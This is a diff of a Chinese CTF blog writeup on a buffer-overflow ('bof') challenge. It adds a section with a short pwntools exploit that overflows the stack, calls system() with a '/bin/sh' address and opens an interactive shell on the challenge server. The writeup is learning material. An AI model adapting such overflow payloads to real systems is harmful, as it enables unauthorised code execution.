@@ -22,7 +22,8 @@
 <meta property="og:image" content="https://s1.ax1x.com/2020/03/14/8lpu38.jpg">
 <meta property="og:image" content="https://s1.ax1x.com/2020/03/14/8lphKe.jpg">
 <meta property="og:image" content="https://s1.ax1x.com/2020/03/14/8lpoVA.jpg">
-<meta property="og:updated_time" content="2020-03-14T15:01:17.721Z">
+<meta property="og:image" content="https://s1.ax1x.com/2020/03/15/885RkF.jpg">
+<meta property="og:updated_time" content="2020-03-15T15:46:41.429Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Stage1Day7 pwn">
 <meta name="twitter:description" content="Blue-whale OJbof writeup.">
@@ -178,7 +179,7 @@
       <span class="post-meta-item-icon" style="color:	#636363;font-size:14px;">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">734字</span>
+        <span class="post-count">744字</span>
       </span>
     </span>
 
@@ -187,7 +188,7 @@
       <span class="post-meta-item-icon" style="color:	#636363;font-size:14px;">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">2分</span>
+        <span class="post-count">3分</span>
       </span>
     </span>
 </div>
@@ -240,8 +241,7 @@ checksec检查的保护机制：
 <p>结合反编译后结果:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> sub_8048573()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_804851B();</span><br><span class="line">  sub_804854A();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"can you pwn me?"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>几点分析：</p>
-<ul>
+<h1 id="几点分析"><a href="#几点分析" class="headerlink" title="几点分析"></a>几点分析</h1><ul>
 <li><p>buf开辟空间大小：1Ch（buf= byte ptr -1Ch）</p>
 </li>
 <li><p>read函数向buf里可写100h字节的数据→<strong>栈溢出</strong></p>
@@ -259,11 +259,18 @@ checksec检查的保护机制：
 <center><img src="https://s1.ax1x.com/2020/03/14/8lpoVA.jpg" alt="8lpoVA.jpg" border="0"></center>
 </li>
 <li><p>确定覆盖位数和方法：<br>1ch * <code>a</code>(buf)+4 * <code>a</code>(read()函数ebp)+<code>0804A05C</code>(system()地址)+4 * <code>a</code>(system()的虚拟返回地址)+<code>0804A02C</code>(system()的参数)</p>
-<blockquote>
-<p>对exp的编写还是不太熟悉，有待进一步学习</p>
-</blockquote>
+<h1 id="exp-amp-getflag"><a href="#exp-amp-getflag" class="headerlink" title="exp&amp;getflag"></a>exp&amp;getflag</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9990</span>)</span><br><span class="line">system = <span class="number">0x080483F0</span></span><br><span class="line">bin = <span class="number">0x0804A02C</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">32</span> + p32(system) + <span class="string">'a'</span>*<span class="number">4</span> + p32(bin)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
 </li>
 </ul>
+<center><img src="https://s1.ax1x.com/2020/03/15/885RkF.jpg" alt="885RkF.jpg" border="0"></center>
+
+
+
+
+
+
+
 
       
       
@@ -337,7 +344,7 @@ checksec检查的保护机制：
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#bof-buffer-overflow"><span class="toc-number">1.</span> <span class="toc-text">bof(buffer overflow)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看文件类型-amp-保护机制"><span class="toc-number">1.1.</span> <span class="toc-text">查看文件类型&amp;保护机制</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#bof-buffer-overflow"><span class="toc-number">1.</span> <span class="toc-text">bof(buffer overflow)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看文件类型-amp-保护机制"><span class="toc-number">1.1.</span> <span class="toc-text">查看文件类型&amp;保护机制</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#几点分析"><span class="toc-number">2.</span> <span class="toc-text">几点分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp-amp-getflag"><span class="toc-number">3.</span> <span class="toc-text">exp&amp;getflag</span></a></li></ol>
                     </div>
                 </span>
             </div>
